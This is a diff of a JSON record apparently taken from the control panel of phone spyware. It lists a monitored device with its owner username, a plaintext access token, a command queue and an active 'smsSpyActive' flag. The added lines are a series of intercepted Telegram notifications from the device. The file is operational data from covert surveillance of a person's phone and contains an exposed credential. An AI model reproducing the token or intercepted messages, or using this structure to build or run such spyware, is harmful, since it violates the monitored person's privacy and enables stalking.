@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775630688055,
+    "lastSeen": 1775630691418,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:44",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775630692045
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:44",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775630691739
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:44",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775630691431
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:44",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775630691425
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:44",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775630691159
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:44",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775630691073
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:44",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775630691070
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
